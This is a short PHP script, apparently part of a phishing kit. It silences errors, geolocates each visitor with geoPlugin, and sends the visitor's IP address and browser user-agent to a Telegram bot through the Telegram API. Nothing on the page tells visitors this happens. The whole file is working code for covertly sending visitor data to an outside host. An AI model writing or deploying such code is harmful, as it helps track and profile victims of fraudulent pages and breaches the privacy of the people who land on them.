<?php
error_reporting(0);
require("../config.php");
require_once('../geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$ip = $geoplugin->ip;
$user = $_SERVER['HTTP_USER_AGENT'];

$url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$id&text=ip: $ip%0Auser: $user";

$sendm =  file_get_contents($url);

